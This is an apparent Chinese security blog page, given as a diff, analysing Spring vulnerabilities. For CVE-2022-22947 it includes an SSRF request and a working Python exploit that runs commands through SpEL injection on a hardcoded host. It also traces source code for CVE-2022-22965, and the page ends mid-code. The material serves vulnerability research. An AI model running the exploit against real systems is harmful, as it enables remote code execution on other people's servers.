@@ -1,0 +1,1122 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  
+  <title itemprop="name">spring-cve | popko&#39;s Blog</title>
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
+  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
+  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/lib.min.css" media="all">
+  <link rel="stylesheet" href="/css/font.css" media="all">
+  <link rel="stylesheet" href="/css/insight.css" media="all">
+  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
+  <link rel="stylesheet" href="/css/zoom.css" media="all">
+  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
+" type="text/css" media="all"> -->
+  <script>
+  /*Initial Variables*/
+  var mashiro_option = new Object();
+  var mashiro_global = new Object();
+  mashiro_option.NProgressON = true;
+  /* 
+   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
+   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
+   */
+  mashiro_option.email_domain = "";
+  mashiro_option.email_name = "";
+  mashiro_option.cookie_version_control = "";
+  mashiro_option.qzone_autocomplete = false;
+  mashiro_option.site_name = "あやねさまのpopko";
+  mashiro_option.author_name = "popko";
+  mashiro_option.site_url = "https://pipimi110.github.io";
+  mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
+  mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
+  mashiro_option.mathjax = "0";
+  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
+  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";
+
+  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
+  // mashiro_option.float_player_on = true;
+
+  /*End of Initial Variables*/
+  </script>
+  <script type="text/javascript">
+  var bg = "https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png,https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_02.png,https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_03.png".split(",");
+  var bgindex = Math.floor(Math.random()*bg.length);
+  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
+    alert('朋友，IE浏览器未适配哦~');
+  }
+  </script>
+  <style type="text/css">
+  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
+  </style>
+  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
+  </style>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
+  <div class="scrollbar" id="bar">
+  </div>
+  <a href="#" class="cd-top faa-float animated"></a>
+  <section id="main-container">
+    <div class="headertop filter-dot">
+  <div id="banner_wave_1"></div>
+  <div id="banner_wave_2"></div>
+  <figure id="centerbg" class="centerbg">
+    <div class="focusinfo no-select">
+      <div class="header-tou">
+        <a href="https://pipimi110.github.io">
+          <img src="/img/custom/avatar.jpg">
+        </a>
+      </div>
+      <div class="header-info">
+        <p>不是二刺螈，只是个喜欢acg和偶尔挖挖洞的阿宅</p>
+        <div class="top-social_v2">
+          <li id="bg-pre">
+            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+          
+            
+              
+                <li>
+                  <a href="https://github.com/pipimi110" target="_blank" class="social-github" title="github">
+                    <img src="https://github.com/favicon.ico">
+                  </a>
+                </li>
+              
+            
+          
+          <li id="bg-next">
+            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+        </div>
+      </div>
+    </div>
+  </figure>
+  <div id="video-container" style="">
+    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
+    </video>
+    <div id="video-btn" class="loadvideo videolive">
+    </div>
+    <div id="video-add">
+    </div>
+    <div class="video-stu">
+    </div>
+  </div>
+  <div class="headertop-down faa-float animated" onclick="headertop_down()">
+    <span>
+      <i class="fa fa-chevron-down" aria-hidden="true">
+      </i>
+    </span>
+  </div>
+</div>
+    <div id="page" class="site wrapper">
+      <header class="site-header no-select gizle sabit" role="banner">
+  <div class="site-top">
+    <div class="site-branding">
+      <span class="site-title">
+        <span class="logolink moe-mashiro">
+          <a href="/">
+            <span class="sakurasono">あやねさまの</span>
+            <span class="shironeko">popko</span>
+          </a>
+        </span>
+      </span>
+    </div>
+    <div class="searchbox search-form-submit">
+      <i class="iconfont js-toggle-search iconsearch icon-search">
+      </i>
+    </div>
+    <div id="show-nav" class="showNav mobile-fit">
+      <div class="line line1">
+      </div>
+      <div class="line line2">
+      </div>
+      <div class="line line3">
+      </div>
+    </div>
+    <div class="lower-cantiner">
+      <div class="lower">
+        <nav class="mobile-fit-control hide">
+          <ul id="menu-new" class="menu">
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+                    笔记
+                  </span>
+                </a>
+                
+              </li>
+            
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      spring-cve</h1>
+      <p class="entry-census">
+        <span>
+          <a href="popko.top">
+            <img src="https://www.popko.top/img/custom/avatar.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="popko.top">popko</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2022-4-5<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
+  </div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <h1 id="spring-cve"><a href="#spring-cve" class="headerlink" title="spring-cve"></a>spring-cve</h1><p>log4j</p>
+<blockquote>
+<p>全局排除</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/supingemail/article/details/112944282">https://blog.csdn.net/supingemail/article/details/112944282</a></p>
+<pre><code>        &lt;dependency&gt;
+            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+            &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt;
+            &lt;exclusions&gt;
+                &lt;exclusion&gt;
+                    &lt;groupId&gt;*&lt;/groupId&gt;
+                    &lt;artifactId&gt;*&lt;/artifactId&gt;
+                &lt;/exclusion&gt;
+            &lt;/exclusions&gt;
+        &lt;/dependency&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+            &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;
+        &lt;/dependency&gt;
+</code></pre><h2 id="CVE-2022-22947"><a href="#CVE-2022-22947" class="headerlink" title="CVE-2022-22947"></a>CVE-2022-22947</h2><p>Spring Cloud Gateway SpEL表达式注入</p>
+<blockquote>
+<p><strong>在动态添加路由的过程中，某个filter可以对传入进来的值进行SpEL表达式解析，从而造成了远程代码执行漏洞</strong></p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/w3et7TzqZ4ctyybEWQ82HQ">https://mp.weixin.qq.com/s/w3et7TzqZ4ctyybEWQ82HQ</a></p>
+<blockquote>
+<p>影响范围：</p>
+<p>Spring Cloud Gateway 3.1.x &lt; 3.1.1</p>
+<p>Spring Cloud Gateway &lt; 3.0.7</p>
+</blockquote>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>vulhub</p>
+<p>利用 actuator 提供的路由添加功能 <a target="_blank" rel="noopener" href="https://docs.spring.io/spring-cloud-gateway/docs/4.0.0-M1/reference/html/#recap-the-list-of-all-endpoints">https://docs.spring.io/spring-cloud-gateway/docs/4.0.0-M1/reference/html/#recap-the-list-of-all-endpoints</a></p>
+<blockquote>
+<p>The folloiwng table below summarizes the Spring Cloud Gateway actuator endpoints (note that each endpoint has <code>/actuator/gateway</code> as the base-path):</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">ID</th>
+<th style="text-align:left">HTTP Method</th>
+<th style="text-align:left">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>globalfilters</code></td>
+<td style="text-align:left">GET</td>
+<td style="text-align:left">Displays the list of global filters applied to the routes.</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>routefilters</code></td>
+<td style="text-align:left">GET</td>
+<td style="text-align:left">Displays the list of <code>GatewayFilter</code> factories applied to a particular route.</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>refresh</code></td>
+<td style="text-align:left">POST</td>
+<td style="text-align:left">Clears the routes cache.</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>routes</code></td>
+<td style="text-align:left">GET</td>
+<td style="text-align:left">Displays the list of routes defined in the gateway.</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>routes/&#123;id&#125;</code></td>
+<td style="text-align:left">GET</td>
+<td style="text-align:left">Displays information about a particular route.</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>routes/&#123;id&#125;</code></td>
+<td style="text-align:left">POST</td>
+<td style="text-align:left">Adds a new route to the gateway.</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>routes/&#123;id&#125;</code></td>
+<td style="text-align:left">DELETE</td>
+<td style="text-align:left">Removes an existing route from the gateway.</td>
+</tr>
+</tbody>
+</table>
+<pre><code>/actuator/gateway/refresh
+/actuator/gateway/routefilters
+/actuator/gateway/globalfilters
+
+/actuator/gateway/routes #查看route_id
+/actuator/gateway/routes/&#123;route_id&#125;
+</code></pre><blockquote>
+<p>GET /actuator/gateway/routes/index HTTP/1.1</p>
+<p>返回</p>
+<p>{“predicate”:”Methods: [GET]”,”route_id”:”index”,”filters”:[],”uri”:”<a href="http://example.com:80&quot;,&quot;order&quot;:0}">http://example.com:80&quot;,&quot;order&quot;:0}</a></p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Path</th>
+<th style="text-align:left">Type</th>
+<th style="text-align:left">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>id</code></td>
+<td style="text-align:left">String</td>
+<td style="text-align:left">The route ID.</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>predicates</code></td>
+<td style="text-align:left">Array</td>
+<td style="text-align:left">The collection of route predicates. Each item defines the name and the arguments of a given predicate.</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>filters</code></td>
+<td style="text-align:left">Array</td>
+<td style="text-align:left">The collection of filters applied to the route.</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>uri</code></td>
+<td style="text-align:left">String</td>
+<td style="text-align:left">The destination URI of the route.</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>order</code></td>
+<td style="text-align:left">Number</td>
+<td style="text-align:left">The route order.</td>
+</tr>
+</tbody>
+</table>
+<p>添加路由 //post格式参考从get获取的数据格式</p>
+<p><a target="_blank" rel="noopener" href="https://docs.spring.io/spring-cloud-gateway/docs/4.0.0-M1/reference/html/#gateway-retrieving-information-about-a-particular-route">https://docs.spring.io/spring-cloud-gateway/docs/4.0.0-M1/reference/html/#gateway-retrieving-information-about-a-particular-route</a></p>
+<p>官方exam</p>
+<pre><code>&#123;
+  &quot;id&quot;: &quot;first_route&quot;,
+  &quot;predicates&quot;: [&#123;
+    &quot;name&quot;: &quot;Path&quot;,
+    &quot;args&quot;: &#123;&quot;_genkey_0&quot;:&quot;/first&quot;&#125;
+  &#125;],
+  &quot;filters&quot;: [],
+  &quot;uri&quot;: &quot;http://150.158.172.182:7777&quot;,
+  &quot;order&quot;: 0
+&#125;
+</code></pre><p>ssrf</p>
+<pre><code>POST /actuator/gateway/routes/new_route HTTP/1.1
+Host: 127.0.0.1:8080
+Connection: close
+Content-Type: application/json
+
+&#123;
+&quot;predicate&quot;: &quot;Paths: [/new_route], match trailing slash: true&quot;,
+&quot;route_id&quot;: &quot;new_route&quot;,
+&quot;filters&quot;: [
+  &quot;[[RewritePath /new_route(?&lt;path&gt;.*) = /$&#123;path&#125;], order = 1]&quot;
+],
+&quot;uri&quot;: &quot;https://www.cnpanda.net&quot;,
+&quot;order&quot;: 0
+&#125;
+</code></pre><blockquote>
+<p>SSRF的payload中多了对过滤器（filters）的具体定义</p>
+</blockquote>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">import requests
+
+url = &quot;http://150.158.172.182:60005/&quot;
+
+def create(route_id,cmd):
+    burp0_url = url+&quot;actuator/gateway/routes/&quot;+route_id
+    burp0_json = &#123;&quot;filters&quot;: [&#123;&quot;args&quot;: &#123;&quot;name&quot;: &quot;Result&quot;, &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;%s\&quot;&#125;).getInputStream()))&#125;&quot;%cmd&#125;, &quot;name&quot;: &quot;AddResponseHeader&quot;&#125;], &quot;uri&quot;: &quot;http://150.158.172.182:7777/qqq&quot;&#125;
+    r = requests.post(burp0_url, json=burp0_json)
+    if r.status_code != 201:
+        print(&quot;create fail&quot;)
+        print(r.text)
+        exit()
+
+def clean(route_id):
+    burp0_url = url+&quot;actuator/gateway/routes/&quot;+route_id
+    requests.delete(burp0_url)
+
+def fresh():
+    burp0_url = url+&quot;actuator/gateway/refresh&quot;
+    requests.post(burp0_url)
+
+def show():
+    fresh()
+    burp0_url = url+&quot;actuator/gateway/routes&quot;
+    r=requests.get(burp0_url)
+    print(r.text)
+
+route_id = &quot;hacktest&quot;
+cmd = &quot;whoami&quot;
+create(route_id,cmd)
+show()
+clean(route_id)
+show()
+
+</code></pre>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>spring-cloud-gateway-server 模块 debug</p>
+<pre><code>    &lt;parent&gt;
+        &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
+        &lt;artifactId&gt;spring-cloud-build&lt;/artifactId&gt;
+&lt;!--        &lt;version&gt;4.0.0-SNAPSHOT&lt;/version&gt;--&gt;
+        &lt;version&gt;3.1.0&lt;/version&gt;
+        &lt;relativePath/&gt;
+</code></pre><h2 id="CVE-2022-22965"><a href="#CVE-2022-22965" class="headerlink" title="CVE-2022-22965"></a>CVE-2022-22965</h2><p><a target="_blank" rel="noopener" href="http://blog.o0o.nu/2010/06/cve-2010-1622.html">http://blog.o0o.nu/2010/06/cve-2010-1622.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/bG3BCdM-suCZldN7FIpYqw">https://mp.weixin.qq.com/s/bG3BCdM-suCZldN7FIpYqw</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/">https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/</a></p>
+<p>spring bean注入</p>
+<pre><code class="java">public class Greeting &#123;
+
+    private long id;
+    private String content;
+
+    public long getId() &#123;
+        return id;
+    &#125;
+
+    public void setId(long id) &#123;
+        this.id = id;
+    &#125;
+</code></pre>
+<pre><code class="java">    @PostMapping(&quot;/greeting&quot;)
+    public String greetingSubmit(@ModelAttribute Greeting greeting, Model model) &#123;
+        return &quot;hello&quot;;
+    &#125;
+</code></pre>
+<pre><code>id=1
+greeting.getId()
+</code></pre><pre><code>class.classloader...=xxx
+greeting.getClass().getClassloader()...
+</code></pre><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20220404163010287.png" alt="image-20220404163010287"></p>
+<p>InvocableHandlerMethod (org.springframework.web.method.support)</p>
+<pre><code>args[i] = this.resolvers.resolveArgument(parameter, mavContainer, request, this.dataBinderFactory);
+</code></pre><p>HandlerMethodArgumentResolverComposite</p>
+<pre><code>    @Nullable
+    public Object resolveArgument(MethodParameter parameter, @Nullable ModelAndViewContainer mavContainer, NativeWebRequest webRequest, @Nullable WebDataBinderFactory binderFactory) throws Exception &#123;
+        HandlerMethodArgumentResolver resolver = this.getArgumentResolver(parameter);
+        if (resolver == null) &#123;
+            throw new IllegalArgumentException(&quot;Unsupported parameter type [&quot; + parameter.getParameterType().getName() + &quot;]. supportsParameter should be called first.&quot;);
+        &#125; else &#123;
+            return resolver.resolveArgument(parameter, mavContainer, webRequest, binderFactory);
+        &#125;
+    &#125;
+</code></pre><h4 id="resolveArgument"><a href="#resolveArgument" class="headerlink" title="resolveArgument"></a>resolveArgument</h4><p>ModelAttributeMethodProcessor</p>
+<pre><code class="java">    public final Object resolveArgument(MethodParameter parameter, @Nullable ModelAndViewContainer mavContainer, NativeWebRequest webRequest, @Nullable WebDataBinderFactory binderFactory) throws Exception &#123;
+        Assert.state(mavContainer != null, &quot;ModelAttributeMethodProcessor requires ModelAndViewContainer&quot;);
+        Assert.state(binderFactory != null, &quot;ModelAttributeMethodProcessor requires WebDataBinderFactory&quot;);
+        String name = ModelFactory.getNameForParameter(parameter);
+        ModelAttribute ann = (ModelAttribute)parameter.getParameterAnnotation(ModelAttribute.class);
+        if (ann != null) &#123;
+            mavContainer.setBinding(name, ann.binding());
+        &#125;
+
+        Object attribute = null;
+        BindingResult bindingResult = null;
+        if (mavContainer.containsAttribute(name)) &#123;
+            attribute = mavContainer.getModel().get(name);
+        &#125; else &#123;
+            try &#123;
+                attribute = this.createAttribute(name, parameter, binderFactory, webRequest);//createAttribute
+            &#125;
+        &#125;
+        ...
+        if (bindingResult == null) &#123;
+            WebDataBinder binder = binderFactory.createBinder(webRequest, attribute, name);//createBinder
+            if (binder.getTarget() != null) &#123;
+                if (!mavContainer.isBindingDisabled(name)) &#123;
+                    this.bindRequestParameters(binder, webRequest);
+                &#125;
+</code></pre>
+<h5 id="createAttribute-根据"><a href="#createAttribute-根据" class="headerlink" title="createAttribute//根据"></a>createAttribute//根据</h5><p>ServletModelAttributeMethodProcessor</p>
+<pre><code class="java">    protected final Object createAttribute(String attributeName, MethodParameter parameter, WebDataBinderFactory binderFactory, NativeWebRequest request) throws Exception &#123;
+        String value = this.getRequestValueForAttribute(attributeName, request);
+        if (value != null) &#123;//null
+        &#125;
+
+        return super.createAttribute(attributeName, parameter, binderFactory, request);
+    &#125;
+
+    //ModelAttributeMethodProcessor
+    protected Object createAttribute(String attributeName, MethodParameter parameter, WebDataBinderFactory binderFactory, NativeWebRequest webRequest) throws Exception &#123;
+        MethodParameter nestedParameter = parameter.nestedIfOptional();
+        Class&lt;?&gt; clazz = nestedParameter.getNestedParameterType();
+        Constructor&lt;?&gt; ctor = BeanUtils.getResolvableConstructor(clazz);//构造函数
+        Object attribute = this.constructAttribute(ctor, attributeName, parameter, binderFactory, webRequest);//类初始化
+        if (parameter != nestedParameter) &#123;
+            attribute = Optional.of(attribute);
+        &#125;
+
+        return attribute;
+    &#125;
+
+    protected Object constructAttribute(Constructor&lt;?&gt; ctor, String attributeName, MethodParameter parameter, WebDataBinderFactory binderFactory, NativeWebRequest webRequest) throws Exception &#123;
+        if (ctor.getParameterCount() == 0) &#123;//无参构造函数
+            return BeanUtils.instantiateClass(ctor, new Object[0]);
+        &#125; else &#123;//有参构造函数
+            ...
+</code></pre>
+<p><strong>BeanUtils</strong></p>
+<pre><code class="java">    public static &lt;T&gt; Constructor&lt;T&gt; getResolvableConstructor(Class&lt;T&gt; clazz) &#123;
+        Constructor&lt;T&gt; ctor = findPrimaryConstructor(clazz);
+        if (ctor != null) &#123;
+            return ctor;
+        &#125; else &#123;
+            Constructor&lt;?&gt;[] ctors = clazz.getConstructors();
+            if (ctors.length == 1) &#123;
+                return ctors[0];//返回构造函数
+            &#125; else &#123;
+                if (ctors.length == 0) &#123;
+                    ctors = clazz.getDeclaredConstructors();
+                    if (ctors.length == 1) &#123;
+                        return ctors[0];
+                    &#125;
+                &#125;
+                try &#123;
+                    return clazz.getDeclaredConstructor();//
+                    ...
+                &#125;
+            &#125;
+        &#125;
+    &#125;
+
+
+    public static &lt;T&gt; T instantiateClass(Constructor&lt;T&gt; ctor, Object... args) throws BeanInstantiationException &#123;
+        Assert.notNull(ctor, &quot;Constructor must not be null&quot;);
+
+        try &#123;
+            ReflectionUtils.makeAccessible(ctor);
+            if (KotlinDetector.isKotlinReflectPresent() &amp;&amp; KotlinDetector.isKotlinType(ctor.getDeclaringClass())) &#123;
+                return BeanUtils.KotlinDelegate.instantiateClass(ctor, args);
+            &#125; else &#123;
+                Class&lt;?&gt;[] parameterTypes = ctor.getParameterTypes();
+                Assert.isTrue(args.length &lt;= parameterTypes.length, &quot;Can&#39;t specify more arguments than constructor parameters&quot;);
+                Object[] argsWithDefaultValues = new Object[args.length];
+
+                for(int i = 0; i &lt; args.length; ++i) &#123;
+                    if (args[i] == null) &#123;
+                        Class&lt;?&gt; parameterType = parameterTypes[i];
+                        argsWithDefaultValues[i] = parameterType.isPrimitive() ? DEFAULT_TYPE_VALUES.get(parameterType) : null;
+                    &#125; else &#123;
+                        argsWithDefaultValues[i] = args[i];
+                    &#125;
+                &#125;
+
+                return ctor.newInstance(argsWithDefaultValues);//类初始化为对象
+</code></pre>
+<h5 id="createBinder"><a href="#createBinder" class="headerlink" title="createBinder"></a>createBinder</h5><p>DefaultDataBinderFactory</p>
+<pre><code>    public final WebDataBinder createBinder(NativeWebRequest webRequest, @Nullable Object target, String objectName) throws Exception &#123;
+        WebDataBinder dataBinder = this.createBinderInstance(target, objectName, webRequest);
+
+    protected WebDataBinder createBinderInstance(@Nullable Object target, String objectName, NativeWebRequest webRequest) throws Exception &#123;
+        return new WebRequestDataBinder(target, objectName);
+    &#125;
+</code></pre><pre><code class="java">    public WebRequestDataBinder(@Nullable Object target, String objectName) &#123;
+        super(target, objectName);
+    &#125;
+    public WebDataBinder(@Nullable Object target, String objectName) &#123;
+        super(target, objectName);
+    &#125;
+
+    public DataBinder(@Nullable Object target, String objectName) &#123;
+        this.directFieldAccess = false;
+        this.ignoreUnknownFields = true;
+        this.ignoreInvalidFields = false;
+        this.autoGrowNestedPaths = true;
+        this.autoGrowCollectionLimit = 256;
+        this.bindingErrorProcessor = new DefaultBindingErrorProcessor();
+        this.validators = new ArrayList();
+        this.target = ObjectUtils.unwrapOptional(target);//设置target
+        this.objectName = objectName;
+    &#125;
+</code></pre>
+<h5 id="bindRequestParameters-参数绑定"><a href="#bindRequestParameters-参数绑定" class="headerlink" title="bindRequestParameters//参数绑定"></a>bindRequestParameters//参数绑定</h5><p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20220404221838912.png" alt="image-20220404221838912"></p>
+<p>ServletModelAttributeMethodProcessor</p>
+<pre><code>    protected void bindRequestParameters(WebDataBinder binder, NativeWebRequest request) &#123;
+        ServletRequest servletRequest = (ServletRequest)request.getNativeRequest(ServletRequest.class);
+        Assert.state(servletRequest != null, &quot;No ServletRequest&quot;);
+        ServletRequestDataBinder servletBinder = (ServletRequestDataBinder)binder;
+        servletBinder.bind(servletRequest);//
+    &#125;
+</code></pre><p>ServletRequestDataBinder</p>
+<pre><code class="java">    public void bind(ServletRequest request) &#123;
+        MutablePropertyValues mpvs = new ServletRequestParameterPropertyValues(request);
+        ...
+        this.doBind(mpvs);
+    &#125;
+    protected void doBind(MutablePropertyValues mpvs) &#123;
+        this.checkFieldDefaults(mpvs);
+        this.checkFieldMarkers(mpvs);
+        this.adaptEmptyArrayIndices(mpvs);
+        super.doBind(mpvs);//
+    &#125;
+    //DataBinder
+    protected void doBind(MutablePropertyValues mpvs) &#123;
+        this.checkAllowedFields(mpvs);
+        this.checkRequiredFields(mpvs);
+        this.applyPropertyValues(mpvs);//
+    &#125;
+    protected void applyPropertyValues(MutablePropertyValues mpvs) &#123;
+        try &#123;
+            this.getPropertyAccessor().setPropertyValues(mpvs, this.isIgnoreUnknownFields(), this.isIgnoreInvalidFields());//this.getPropertyAccessor().setPropertyValues()
+</code></pre>
+<h6 id="getPropertyAccessor"><a href="#getPropertyAccessor" class="headerlink" title="getPropertyAccessor"></a><strong>getPropertyAccessor</strong></h6><p>DataBinder</p>
+<pre><code class="java">    protected ConfigurablePropertyAccessor getPropertyAccessor() &#123;
+        return this.getInternalBindingResult().getPropertyAccessor();
+    &#125;
+    protected AbstractPropertyBindingResult getInternalBindingResult() &#123;
+        if (this.bindingResult == null) &#123;
+            this.bindingResult = this.directFieldAccess ? this.createDirectFieldBindingResult() : this.createBeanPropertyBindingResult();
+        &#125;
+        return this.bindingResult;
+    &#125;
+    protected AbstractPropertyBindingResult createBeanPropertyBindingResult() &#123;
+        BeanPropertyBindingResult result = new BeanPropertyBindingResult(this.getTarget(), this.getObjectName(), this.isAutoGrowNestedPaths(), this.getAutoGrowCollectionLimit());
+        if (this.conversionService != null) &#123;
+            result.initConversion(this.conversionService);//initConversion
+        &#125;
+        if (this.messageCodesResolver != null) &#123;//null
+            ...
+        &#125;
+        return result;
+    &#125;
+</code></pre>
+<p>BeanPropertyBindingResult</p>
+<pre><code class="java">    public void initConversion(ConversionService conversionService) &#123;
+        Assert.notNull(conversionService, &quot;ConversionService must not be null&quot;);
+        this.conversionService = conversionService;
+        if (this.getTarget() != null) &#123;
+            this.getPropertyAccessor().setConversionService(conversionService);
+        &#125;
+    &#125;
+</code></pre>
+<pre><code class="java">    public final ConfigurablePropertyAccessor getPropertyAccessor() &#123;
+        if (this.beanWrapper == null) &#123;
+            this.beanWrapper = this.createBeanWrapper();//
+            ...
+        &#125;
+
+        return this.beanWrapper;//getPropertyAccessor() 返回 BeanWrapperImpl
+    &#125;
+    protected BeanWrapper createBeanWrapper() &#123;
+        if (this.target == null) &#123;
+            ...
+        &#125; else &#123;
+            return PropertyAccessorFactory.forBeanPropertyAccess(this.target);//
+        &#125;
+    &#125;
+</code></pre>
+<p>PropertyAccessorFactory</p>
+<pre><code>    public static BeanWrapper forBeanPropertyAccess(Object target) &#123;
+        return new BeanWrapperImpl(target);
+    &#125;
+</code></pre><p>BeanWrapperImpl //<strong>target-&gt;wrappedObject</strong></p>
+<pre><code class="java">    public BeanWrapperImpl(Object object) &#123;
+        super(object);
+    &#125;
+    //AbstractNestablePropertyAccessor
+    protected AbstractNestablePropertyAccessor(Object object) &#123;
+        ...
+        this.setWrappedInstance(object);
+    &#125;
+    public void setWrappedInstance(Object object, @Nullable String nestedPath, @Nullable Object rootObject) &#123;
+        this.wrappedObject = ObjectUtils.unwrapOptional(object);//target-&gt;wrappedObject
+</code></pre>
+<h6 id="setPropertyValues"><a href="#setPropertyValues" class="headerlink" title="setPropertyValues"></a><strong>setPropertyValues</strong></h6><p>BeanWrapperImpl</p>
+<pre><code class="java">    public void setPropertyValues(PropertyValues pvs, boolean ignoreUnknown, boolean ignoreInvalid) throws BeansException &#123;
+        List&lt;PropertyAccessException&gt; propertyAccessExceptions = null;
